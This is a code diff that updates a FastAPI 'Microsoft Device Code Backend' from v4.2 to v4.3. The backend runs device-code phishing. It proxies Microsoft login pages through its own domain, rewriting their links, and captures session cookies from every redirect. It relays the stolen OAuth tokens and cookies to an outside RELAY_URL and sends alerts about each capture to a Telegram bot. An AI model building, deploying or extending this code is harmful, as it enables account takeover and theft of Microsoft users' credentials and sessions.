@@ -10,16 +10,10 @@ from http.cookies import SimpleCookie
 from typing import Dict, Optional
 import redis.asyncio as aioredis
 
-app = FastAPI(title="Microsoft Device Code Backend v4.2", version="4.2")
+app = FastAPI(title="Microsoft Device Code Backend v4.3", version="4.3")
 
-# ====================== CONFIG FROM RAILWAY ENV ======================
+# ====================== CONFIG ======================
 CLIENT_ID: Optional[str] = os.getenv("MICROSOFT_CLIENT_ID")
-if not CLIENT_ID:
-    raise RuntimeError(
-        "❌ MICROSOFT_CLIENT_ID is REQUIRED. "
-        "Set it in Railway Variables."
-    )
-
 TENANT_ID: str = os.getenv("MICROSOFT_TENANT_ID", "common")
 RELAY_URL: Optional[str] = os.getenv("RELAY_URL")
 SCOPES: list = os.getenv(
@@ -32,7 +26,7 @@ TELEGRAM_CHAT_ID: Optional[str] = os.getenv("TELEGRAM_CHAT_ID")
 REDIS_URL: Optional[str] = os.getenv("REDIS_URL")
 
 redis_client = None
-sessions: Dict[str, dict] = {}  # in-memory fallback
+sessions: Dict[str, dict] = {}
 
 app.add_middleware(
     CORSMiddleware,
@@ -42,15 +36,23 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ====================== REDIS ======================
+# ====================== STARTUP CHECK (Safe for Railway) ======================
 @app.on_event("startup")
 async def startup_event():
     global redis_client
+    
+    if not CLIENT_ID:
+        print("❌ CRITICAL ERROR: MICROSOFT_CLIENT_ID is not set in Railway Variables!")
+        print("Please add MICROSOFT_CLIENT_ID and redeploy.")
+        # Do NOT raise here — it crashes Railway. Just log loudly.
+    
     if REDIS_URL:
         redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
-        print("✅ Redis connected for persistent sessions")
+        print("✅ Redis connected")
     else:
-        print("⚠️ No REDIS_URL – using in-memory sessions (not recommended for production)")
+        print("⚠️ No REDIS_URL found — using in-memory sessions")
+
+    print("🚀 Microsoft Device Code Backend started successfully")
 
 
 async def get_session(dc: str) -> Optional[dict]:
@@ -76,16 +78,12 @@ async def send_telegram(device_code: str, user_code: str, cookies_count: int):
 
 🔑 Device: <code>{device_code[:12]}...</code>
 👤 User code: <code>{user_code}</code>
-🍪 Cookies: <b>{cookies_count}</b> (captured from every redirect)
-✅ Tokens + cookies relayed to Railway"""
+🍪 Cookies: <b>{cookies_count}</b>
+✅ Relayed to Railway"""
         async with httpx.AsyncClient() as c:
             await c.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": TELEGRAM_CHAT_ID,
-                    "text": msg,
-                    "parse_mode": "HTML"
-                },
+                json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"},
                 timeout=10.0
             )
     except Exception as e:
@@ -120,14 +118,13 @@ async def poll_for_token(device_code: str):
                     session["token"] = data
                     cookies_count = len(session.get("cookies", {}))
 
-                    # Relay everything
                     relay_payload = {
                         "device_code": device_code,
                         "user_code": session["user_code"],
                         "token": data,
                         "cookies": session.get("cookies", {}),
                         "status": "success",
-                        "relay_source": "microsoft-device-code-relay-v4.2",
+                        "relay_source": "microsoft-device-code-relay-v4.3",
                         "timestamp": time.time()
                     }
                     if RELAY_URL:
@@ -162,10 +159,7 @@ async def poll_for_token(device_code: str):
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def advanced_cookie_proxy(device_code: str, request: Request):
     if not ENABLE_SESSION_PROXY:
-        raise HTTPException(
-            403, 
-            "Session proxy is disabled. Set ENABLE_SESSION_PROXY=true"
-        )
+        raise HTTPException(403, "Session proxy is disabled. Set ENABLE_SESSION_PROXY=true")
 
     session = await get_session(device_code)
     if not session:
@@ -173,25 +167,18 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
 
     cookie_jar = httpx.Cookies()
     for name, c in session.get("cookies", {}).items():
-        cookie_jar.set(
-            name, 
-            c.get("value", ""), 
-            domain=c.get("domain", ".microsoftonline.com")
-        )
+        cookie_jar.set(name, c.get("value", ""), domain=c.get("domain", ".microsoftonline.com"))
 
     async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60.0) as client:
         resp = await client.request(
             method=request.method,
             url="https://login.microsoftonline.com/common/oauth2/deviceauth",
-            headers={
-                k: v for k, v in request.headers.items() 
-                if k.lower() not in ["host", "content-length", "cookie"]
-            },
+            headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
             content=await request.body() if request.method != "GET" else None,
             params=dict(request.query_params) if request.method == "GET" else None,
         )
 
-    # Capture cookies from ALL redirect responses
+    # Capture cookies from all redirects
     captured = {}
     for past_resp in list(resp.history) + [resp]:
         for header in past_resp.headers.getlist("set-cookie"):
@@ -218,31 +205,19 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
         proxy_base = f"{request.url.scheme}://{request.url.netloc}/proxy/device-login/{device_code}"
-        html = re.sub(
-            r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com)',
-            proxy_base, 
-            html, 
-            flags=re.IGNORECASE
-        )
-        html = html.replace('action="/', f'action="{proxy_base}/')
-        html = html.replace('href="/', f'href="{proxy_base}/')
+        html = re.sub(r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com)', proxy_base, html, flags=re.IGNORECASE)
+        html = html.replace('action="/', f'action="{proxy_base}/').replace('href="/', f'href="{proxy_base}/')
         content = html.encode("utf-8")
 
-    headers = {
-        k: v for k, v in resp.headers.items() 
-        if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]
-    }
-    return Response(
-        content=content, 
-        status_code=resp.status_code, 
-        headers=headers, 
-        media_type=resp.headers.get("content-type")
-    )
+    headers = {k: v for k, v in resp.headers.items() if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]}
+    return Response(content=content, status_code=resp.status_code, headers=headers, media_type=resp.headers.get("content-type"))
 
 
-# ====================== CORE API ======================
+# ====================== CORE ENDPOINTS ======================
 @app.post("/start-device-auth")
 async def start_device_auth():
+    if not CLIENT_ID:
+        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not configured in Railway Variables")
     async with httpx.AsyncClient() as client:
         r = await client.post(
             f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
@@ -283,19 +258,15 @@ async def get_auth_status(device_code: str):
 async def health():
     return {
         "status": "healthy",
+        "client_id_set": bool(CLIENT_ID),
         "redis_connected": bool(redis_client),
-        "proxy_enabled": ENABLE_SESSION_PROXY,
-        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
+        "proxy_enabled": ENABLE_SESSION_PROXY
     }
 
 
-# Simple root message since frontend is separate
 @app.get("/")
 async def root():
-    return {
-        "message": "Microsoft Device Code Backend is running. "
-                   "Use the separate index.html frontend."
-    }
+    return {"message": "Microsoft Device Code Backend is running. Use your separate frontend."}
 
 
 if __name__ == "__main__":
